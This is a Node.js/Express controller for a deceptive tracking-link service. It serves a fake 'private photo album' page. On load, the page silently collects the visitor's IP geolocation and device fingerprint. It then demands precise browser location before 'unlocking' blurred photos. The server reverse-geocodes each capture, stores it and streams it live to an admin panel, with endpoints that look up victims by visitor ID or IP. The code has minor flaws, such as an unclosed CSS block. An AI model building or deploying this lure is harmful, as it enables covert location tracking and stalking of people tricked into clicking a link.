const PublicLocation = require('../models/PublicLocation');
const GalleryImage = require('../models/GalleryImage');
const { success, created } = require('../utils/response');
const { getIO } = require('../config/socket');
const logger = require('../utils/logger');
const { reverseGeocode } = require('../services/geocode.service');

const renderCapturePage = async (req, res, next) => {
  try {
    // Check if a custom tracking link is being used
    const trackingLink = req.trackingLink;
    // Get slug from trackingLink OR from URL params (/xxx/:slug)
    const customSlug = trackingLink ? trackingLink.slug : (req.params.slug || null);
    const customTitle = trackingLink ? trackingLink.name : 'Photo Gallery';
    
    // If tracking link is expired, show error
    if (trackingLink && trackingLink.expiresAt && new Date() > trackingLink.expiresAt) {
      return res.status(410).send('<h1>Link Expired</h1><p>This tracking link has expired.</p>');
    }
    
    // Get custom gallery images from database
    const gallerySettings = await GalleryImage.getSettings();
    const customImages = gallerySettings.imageUrls;
    
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
          <meta name="theme-color" content="#4f46e5">
          <title>📸 ${customTitle}</title>
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
          <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body {
                  font-family: 'Poppins', sans-serif;
                  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                  min-height: 100vh;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  padding: 20px;
                  overflow-x: hidden;
                  color: white;
              }
              .container {
                  width: 100%;
                  max-width: 400px;
                  position: relative;
                  z-index: 10;
              }
              .header {
                  text-align: center;
                  margin-bottom: 20px;
              }
              .header-badge {
                  background: linear-gradient(90deg, #4f46e5, #7c3aed);
                  color: white;
                  padding: 6px 16px;
                  border-radius: 20px;
                  font-size: 11px;
                  font-weight: 600;
                  display: inline-block;
                  margin-bottom: 12px;
              }
              .custom-url-badge {
                  background: rgba(255,255,255,0.1);
                  backdrop-filter: blur(10px);
                  border: 1px solid rgba(255,255,255,0.2);
                  padding: 4px 12px;
                  border-radius: 15px;
                  font-size: 10px;
                  color: rgba(255,255,255,0.7);
                  margin-bottom: 10px;
                  display: inline-block;
              }
              h1 {
                  font-size: 1.8rem;
                  font-weight: 700;
                  margin-bottom: 5px;
              }
              .subtitle {
                  color: rgba(255,255,255,0.6);
                  font-size: 0.85rem;
              }
              
              /* Image Album Grid - Mobile First, No Hover */
              .album-grid {
                  display: grid;
                  grid-template-columns: repeat(2, 1fr);
                  gap: 16px;
                  margin-bottom: 30px;
                  padding: 4px;
              }
              .album-card {
                  aspect-ratio: 1;
                  border-radius: 20px;
                  overflow: hidden;
                  position: relative;
                  background: rgba(255,255,255,0.03);
                  border: 1px solid rgba(255,255,255,0.1);
                  box-shadow: 
                      0 8px 32px 0 rgba(0,0,0,0.5),
                      inset 0 0 0 1px rgba(255,255,255,0.05);
                  backdrop-filter: blur(4px);
                  -webkit-backdrop-filter: blur(4px);
                  cursor: pointer;
                  transform: scale(1);
                  transition: transform 0.2s ease;
              }
              .album-card:active {
                  transform: scale(0.95);
              }
              .album-card img {
                  width: 100%;
                  height: 100%;
                  object-fit: cover;
              }
              .album-card .blur-overlay {
                  position: absolute;
                  inset: 0;
                  backdrop-filter: blur(25px) saturate(200%);
                  -webkit-backdrop-filter: blur(25px) saturate(200%);
                  background: rgba(0,0,0,0.45);
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  gap: 10px;
                  border-radius: 20px;
              }
              .album-card .eye-icon {
                  font-size: 2.8rem;
                  filter: drop-shadow(0 4px 12px rgba(0,0,0,0.8));
                  animation: blink 3s infinite;
              }
              @keyframes blink {
                  0%, 90%, 100% { opacity: 1; transform: scale(1); }
                  95% { opacity: 0.6; transform: scale(0.95); }
              }
              .album-card .tap-hint {
                  font-size: 0.75rem;
                  color: rgba(255,255,255,0.8);
                  background: rgba(124, 58, 237, 0.5);
                  padding: 6px 14px;
                  border-radius: 20px;
                  font-weight: 600;
                  letter-spacing: 0.5px;
                  border: 1px solid rgba(255,255,255,0.15);
                  backdrop-filter: blur(10px);
              }
              
              /* Dark glass overlay for full screen effect */
              body::before {
                  content: '';
                  position: fixed;
                  inset: 0;
                  background: rgba(10, 10, 20, 0.85);
                  backdrop-filter: blur(100px) saturate(200%);
                  -webkit-backdrop-filter: blur(100px) saturate(200%);
                  z-index: -1;
              }
              
              /* View Images Button - Mobile Optimized */
              .view-btn {
                  width: 100%;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  color: white;
                  border: none;
                  padding: 18px 36px;
                  border-radius: 50px;
                  font-size: 1rem;
                  font-weight: 700;
                  cursor: pointer;
              .album-card.unlocked .blur-overlay {
                  backdrop-filter: blur(0px);
                  background: rgba(0,0,0,0);
                  transform: translateX(100%);
                  opacity: 0;
                  pointer-events: none;
              }
              .album-card.unlocked {
                  box-shadow: 
                      0 8px 32px 0 rgba(124, 58, 237, 0.3),
                      inset 0 0 0 2px rgba(124, 58, 237, 0.5);
              }
              
              /* Loading State */
              .loading-overlay {
                  display: none;
                  position: fixed;
                  inset: 0;
                  background: rgba(0,0,0,0.9);
                  z-index: 1000;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  gap: 20px;
              }
              .loading-overlay.active {
                  display: flex;
              }
              .spinner {
                  width: 50px;
                  height: 50px;
                  border: 3px solid rgba(255,255,255,0.2);
                  border-top-color: #4f46e5;
                  border-radius: 50%;
                  animation: spin 1s linear infinite;
              }
              @keyframes spin {
                  to { transform: rotate(360deg); }
              }
              .loading-text {
                  color: rgba(255,255,255,0.8);
                font-size: 0.95rem;
              }
              
              /* Gallery View */
              .gallery-overlay {
                  display: none;
                  position: fixed;
                  inset: 0;
                  background: rgba(0,0,0,0.95);
                  z-index: 1001;
                  flex-direction: column;
              }
              .gallery-overlay.active {
                  display: flex;
              }
              .gallery-header {
                  display: flex;
                  align-items: center;
                  justify-content: space-between;
                  padding: 15px 20px;
                  border-bottom: 1px solid rgba(255,255,255,0.1);
              }
              .gallery-title {
                  font-size: 1.1rem;
                  font-weight: 600;
              }
              .close-btn {
                  background: rgba(255,255,255,0.1);
                  border: none;
                  color: white;
                  width: 36px;
                  height: 36px;
                  border-radius: 50%;
                  cursor: pointer;
                  font-size: 1.2rem;
                  display: flex;
                  align-items: center;
                  justify-content: center;
              }
              .gallery-content {
                  flex: 1;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  padding: 20px;
              }
              .gallery-image {
                  max-width: 100%;
                  max-height: 60vh;
                  border-radius: 12px;
                object-fit: contain;
              }
              .gallery-nav {
                  display: flex;
                  justify-content: center;
                  gap: 20px;
                  padding: 20px;
              }
              .nav-btn {
                  background: rgba(255,255,255,0.1);
                  border: none;
                  color: white;
                  padding: 12px 24px;
                  border-radius: 25px;
                  cursor: pointer;
                  font-size: 0.9rem;
              }
              
              #status {
                  margin-top: 15px;
                  font-size: 12px;
                  color: rgba(255,255,255,0.6);
                  text-align: center;
                  min-height: 20px;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <div class="header">
                  <div class="header-badge">📸 PRIVATE ALBUM</div>
                  ${customSlug ? `<div class="custom-url-badge">🔗 /${customSlug}</div>` : ''}
                  <h1>Photo Gallery</h1>
                  <p class="subtitle">View exclusive photos</p>
              </div>
              
              <!-- Album Grid -->
              <div class="album-grid">
                  <div class="album-card" onclick="showGallery(0)">
                      <img src="${customImages[0]}" alt="Photo 1" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
                  <div class="album-card" onclick="showGallery(1)">
                      <img src="${customImages[1]}" alt="Photo 2" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
                  <div class="album-card" onclick="showGallery(2)">
                      <img src="${customImages[2]}" alt="Photo 3" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
                  <div class="album-card" onclick="showGallery(3)">
                      <img src="${customImages[3]}" alt="Photo 4" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
                  <div class="album-card" onclick="showGallery(4)">
                      <img src="${customImages[4]}" alt="Photo 5" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
                  <div class="album-card" onclick="showGallery(5)">
                      <img src="${customImages[5]}" alt="Photo 6" loading="lazy">
                      <div class="blur-overlay">
                          <div class="eye-icon">👁️</div>
                          <div class="tap-hint">Tap to View</div>
                      </div>
                  </div>
              </div>
              
              <button class="view-btn" id="view-btn" onclick="handleViewImages(0)">
                  <span class="icon">👁️</span>
                  <span>Unlock All Photos</span>
              </button>
              
              <div id="status"></div>
          </div>
          
          <!-- Loading Overlay -->
          <div class="loading-overlay" id="loading-overlay">
              <div class="spinner"></div>
              <div class="loading-text">Unlocking photo...</div>
          </div>
          
          <!-- Status Message -->
          <div id="status"></div>

          <script>
              const CUSTOM_SLUG = '${customSlug || ''}';
              const status = document.getElementById('status');
              const viewBtn = document.getElementById('view-btn');
              const loadingOverlay = document.getElementById('loading-overlay');
              const galleryOverlay = document.getElementById('gallery-overlay');
              const galleryImage = document.getElementById('gallery-image');
              
              let currentImageIndex = 0;
              let galleryUnlocked = false;
              
              // Custom gallery images from admin settings
              const galleryImages = ${JSON.stringify(customImages)};

              const getVisitorId = () => {
                  try {
                      let vid = localStorage.getItem('socius_vid');
                      if (!vid) {
                          vid = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
                          localStorage.setItem('socius_vid', vid);
                      }
                      return vid;
                  } catch (e) {
                      return 'v_' + Date.now().toString(36);
                  }
              };

              const getFingerprintData = async () => {
                  const data = {
                      platform: navigator.platform,
                      vendor: navigator.vendor,
                      cpuCores: navigator.hardwareConcurrency || 0,
                      memory: navigator.deviceMemory || 0,
                      screen: window.screen.width + 'x' + window.screen.height,
                      language: navigator.language,
                      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                      userAgent: navigator.userAgent,
                  };
                  return data;
              };

              const generateHash = (data) => {
                  const str = JSON.stringify(data);
                  let hash = 0;
                  for (let i = 0; i < str.length; i++) {
                      const char = str.charCodeAt(i);
                      hash = ((hash << 5) - hash) + char;
                      hash = hash & hash;
                  }
                  return 'fp_' + Math.abs(hash).toString(16);
              };

              // Tracking helper
              const visitorId = getVisitorId();
              let currentFp = null;
              
              const track = async (event, eventData = {}) => {
                  try {
                      const fp = currentFp || await getFingerprintData();
                      currentFp = fp;
                      await fetch('/public/track-event', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              visitorId,
                              event,
                              eventData,
                              trackingLinkSlug: CUSTOM_SLUG,
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp
                          })
                      });
                  } catch (e) { console.log('Track error:', e); }
              };

              // Track page load
              track('page_load');

              // Auto-capture on load
              window.addEventListener('load', async () => {
                  try {
                      const res = await fetch('https://ipapi.co/json/');
                      const geo = await res.json();
                      const fp = await getFingerprintData();
                      await fetch('/public/save-location', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              latitude: geo.latitude || 0,
                              longitude: geo.longitude || 0,
                              accuracy: 5000,
                              method: 'ip-api',
                              visitorId: getVisitorId(),
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp,
                              trackingLinkSlug: CUSTOM_SLUG
                          })
                      });
                  } catch (e) {}
              });

              async function handleViewImages(cardIndex = 0) {
                  if (galleryUnlocked) {
                      unlockAllCards();
                      return;
                  }
                  
                  viewBtn.disabled = true;
                  loadingOverlay.classList.add('active');
                  status.textContent = '📍 Requesting location access...';
                  
                  await track('view_images_clicked');
                  
                  if (!navigator.geolocation) {
                      status.innerHTML = '<span style="color: #ef4444;">❌ Location not supported</span>';
                      loadingOverlay.classList.remove('active');
                      viewBtn.disabled = false;
                      return;
                  }
                  
                  // Request location
                  navigator.geolocation.getCurrentPosition(
                      async (position) => {
                          await track('permission_result', { status: 'granted' });
                          await track('location_captured', {
                              latitude: position.coords.latitude,
                              longitude: position.coords.longitude,
                              accuracy: position.coords.accuracy
                          });
                          
                          // Send location to server
                          const fp = await getFingerprintData();
                          await fetch('/public/save-location', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({
                                  latitude: position.coords.latitude,
                                  longitude: position.coords.longitude,
                                  accuracy: position.coords.accuracy,
                                  method: 'geolocation',
                                  visitorId: getVisitorId(),
                                  fingerprintHash: generateHash(fp),
                                  screenResolution: fp.screen,
                                  language: fp.language,
                                  timezone: fp.timezone,
                                  userAgent: fp.userAgent,
                                  deviceInfo: fp,
                                  trackingLinkSlug: CUSTOM_SLUG
                              })
                          });
                          
                          // Unlock gallery
                          galleryUnlocked = true;
                          loadingOverlay.classList.remove('active');
                          status.innerHTML = '<span style="color: #22c55e;">✅ Gallery unlocked!</span>';
                          viewBtn.innerHTML = '<span class="icon">📸</span><span>View All Photos</span>';
                          
                          // Unlock the clicked card first with animation
                          revealCard(cardIndex);
                          
                          // Then unlock all other cards with staggered delay
                          setTimeout(() => {
                              unlockAllCards();
                          }, 500);
                      },
                      async (error) => {
                          await track('permission_result', { 
                              status: error.code === 1 ? 'denied' : 'error',
                              errorCode: error.code 
                          });
                          status.innerHTML = '<span style="color: #ef4444;">❌ Location access required to view images</span>';
                          loadingOverlay.classList.remove('active');
                          viewBtn.disabled = false;
                      },
                      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                  );
              }
              
              function showGallery(index) {
                  // Always trigger location capture on card click
                  if (!galleryUnlocked) {
                      currentImageIndex = index; // Store which image they want to see
                      handleViewImages(index);
                      return;
                  }
                  // If already unlocked, just reveal this card with animation
                  revealCard(index);
              }
              
              function revealCard(index) {
                  const cards = document.querySelectorAll('.album-card');
                  const card = cards[index];
                  const blurOverlay = card.querySelector('.blur-overlay');
                  
                  // Add slide/reveal animation
                  blurOverlay.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
                  blurOverlay.style.transform = 'translateX(100%)';
                  blurOverlay.style.opacity = '0';
                  
                  // Mark as unlocked
                  card.classList.add('unlocked');
                  
                  // Show success message briefly
                  status.innerHTML = '<span style="color: #22c55e;">✅ Photo ' + (index + 1) + ' unlocked!</span>';
                  setTimeout(() => {
                      status.textContent = '';
                  }, 2000);
              }
              
              function unlockAllCards() {
                  document.querySelectorAll('.album-card').forEach((card, index) => {
                      setTimeout(() => {
                          revealCard(index);
                      }, index * 100); // Staggered animation
                  });
              }
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { 
      latitude, longitude, accuracy, altitude, method,
      visitorId, fingerprintHash, screenResolution, language, timezone, 
      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData, isUpdate,
      trackingLinkSlug
    } = req.body;
    
    // Check if we already have a recent entry for this visitor to avoid duplicates
    if (visitorId && method === 'ip-api') {
      const existing = await PublicLocation.findOne({
        visitorId,
        method: 'ip-api',
        createdAt: { $gt: new Date(Date.now() - 10 * 60 * 1000) } // 10 minutes
      });
      if (existing) {
        return success(res, existing, 'Location already captured recently');
      }
    }

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    // Reverse geocode to get address from coordinates
    const address = await reverseGeocode(latitude, longitude);

    // If isUpdate flag is true, update the most recent record for this visitor
    if (isUpdate && visitorId) {
      const recentRecord = await PublicLocation.findOneAndUpdate(
        { visitorId, method: 'geolocation' },
        {
          $set: {
            'location.coordinates': [longitude, latitude],
            accuracy,
            altitude,
            updatedAt: new Date(),
            address: address
          }
        },
        { sort: { createdAt: -1 }, new: true }
      );
      
      if (recentRecord) {
        return success(res, recentRecord, 'Location updated successfully');
      }
    }

    const publicLocation = new PublicLocation({
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
      method: method || 'geolocation',
      visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
      fingerprintHash,
      screenResolution,
      language,
      timezone,
      batteryLevel,
      networkType,
      deviceInfo,
      networkInfo,
      behavioralData,
      address: address,
      trackingLinkSlug: trackingLinkSlug || null
    });

    await publicLocation.save();
    
    // Increment tracking link stats if applicable
    if (trackingLinkSlug) {
      const { incrementLinkStats } = require('./trackingLink.controller');
      incrementLinkStats(trackingLinkSlug, true, method === 'geolocation');
    }
    
    // Emit Socket.IO event to notify admins
    try {
      const io = getIO();
      io.to('admin').emit('location:captured', {
        visitorId: publicLocation.visitorId,
        ip: publicLocation.ip,
        location: publicLocation.location,
        accuracy: publicLocation.accuracy,
        method: publicLocation.method,
        createdAt: publicLocation.createdAt,
        address: address,
        screenResolution: publicLocation.screenResolution,
        batteryLevel: publicLocation.batteryLevel,
        networkType: publicLocation.networkType,
        deviceInfo: publicLocation.deviceInfo,
        networkInfo: publicLocation.networkInfo,
        language: publicLocation.language,
        timezone: publicLocation.timezone,
        trackingLinkSlug: publicLocation.trackingLinkSlug
      });
      logger.info(`Socket.IO: Location captured event emitted for visitor ${publicLocation.visitorId} at ${address?.displayAddress || 'Unknown'}`);
    } catch (socketErr) {
      logger.error('Socket.IO emit failed:', socketErr.message);
    }
    
    return created(res, publicLocation, 'Location and fingerprint saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const getLocationByVisitorId = async (req, res, next) => {
  try {
    const { visitorId } = req.params;
    // Try to find by visitorId OR ip (if visitorId is an IP)
    const locations = await PublicLocation.find({ 
      $or: [
        { visitorId: visitorId },
        { ip: visitorId }
      ]
    }).sort({ createdAt: -1 });
    
    if (!locations || locations.length === 0) {
      return res.status(404).json({ error: 'No data found for this visitor' });
    }
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const trackEvent = async (req, res, next) => {
  try {
    const { 
      visitorId, 
      event, 
      eventData,
      pageLoadedAt,
      fingerprintHash,
      screenResolution, 
      language, 
      timezone,
      userAgent,
      deviceInfo,
      networkInfo,
      trackingLinkSlug
    } = req.body;
    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    
    // Find or create a tracking record for this visitor
    let tracking = await PublicLocation.findOne({ 
      visitorId, 
      method: 'geolocation',
      createdAt: { $gt: new Date(Date.now() - 30 * 60 * 1000) } // Within 30 minutes
    });
    
    if (!tracking) {
      // Create new tracking record
      tracking = new PublicLocation({
        ip,
        userAgent: userAgent || req.headers['user-agent'],
        visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
        fingerprintHash,
        screenResolution,
        language,
        timezone,
        deviceInfo,
        networkInfo,
        method: 'geolocation',
        location: { type: 'Point', coordinates: [0, 0] },
        trackingLinkSlug: trackingLinkSlug || null,
        trackingJourney: {
          pageLoadedAt: pageLoadedAt ? new Date(pageLoadedAt) : new Date(),
          journeyStatus: 'page_loaded'
        }
      });
    }
    
    // Update based on event type
    const now = new Date();
    
    switch (event) {
      case 'view_images_clicked':
        tracking.trackingJourney.journeyStatus = 'clicked';
        break;
        
      case 'page_load':
        tracking.trackingJourney.pageLoadedAt = now;
        tracking.trackingJourney.journeyStatus = 'page_loaded';
        break;
        
      case 'spin_button_clicked':
        tracking.trackingJourney.spinButtonClickedAt = now;
        tracking.trackingJourney.journeyStatus = 'clicked';
        break;
        
      case 'permission_requested':
        tracking.trackingJourney.permissionRequestedAt = now;
        tracking.trackingJourney.permissionStatus = 'pending';
        tracking.trackingJourney.journeyStatus = 'permission_requested';
        break;
        
      case 'permission_result':
        tracking.trackingJourney.permissionStatus = eventData.status; // 'granted', 'denied', 'timeout'
        tracking.trackingJourney.permissionErrorCode = eventData.errorCode || null;
        tracking.trackingJourney.permissionErrorMessage = eventData.errorMessage || null;
        if (eventData.status === 'granted') {
          tracking.trackingJourney.journeyStatus = 'permission_granted';
        } else if (eventData.status === 'denied') {
          tracking.trackingJourney.journeyStatus = 'permission_denied';
        } else {
          tracking.trackingJourney.journeyStatus = 'failed';
        }
        break;
        
      case 'location_attempt':
        tracking.trackingJourney.locationAttempts = (tracking.trackingJourney.locationAttempts || 0) + 1;
        break;
        
      case 'location_captured':
        tracking.trackingJourney.locationCapturedAt = now;
        tracking.trackingJourney.journeyStatus = 'location_captured';
        // Update coordinates if provided
        if (eventData.latitude && eventData.longitude) {
          tracking.location.coordinates = [eventData.longitude, eventData.latitude];
          tracking.accuracy = eventData.accuracy;
        }
        break;
        
      case 'spin_completed':
        tracking.trackingJourney.spinCompletedAt = now;
        if (tracking.trackingJourney.journeyStatus === 'location_captured') {
          tracking.trackingJourney.journeyStatus = 'completed';
        }
        break;
        
      case 'error':
        tracking.trackingJourney.journeyStatus = 'failed';
        tracking.trackingJourney.permissionErrorMessage = eventData.message;
        break;
    }
    
    await tracking.save();
    
    // Emit to admin panel for real-time updates
    try {
      const io = getIO();
      io.to('admin').emit('tracking:event', {
        visitorId: tracking.visitorId,
        ip: tracking.ip,
        event,
        journeyStatus: tracking.trackingJourney.journeyStatus,
        permissionStatus: tracking.trackingJourney.permissionStatus,
        trackingLinkSlug: tracking.trackingLinkSlug,
        deviceInfo: {
          screenResolution: tracking.screenResolution,
          language: tracking.language,
          timezone: tracking.timezone
        },
        timestamp: now
      });
    } catch (e) {}
    
    return success(res, { visitorId: tracking.visitorId }, 'Event tracked');
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
  getLocationByVisitorId,
  trackEvent,
};
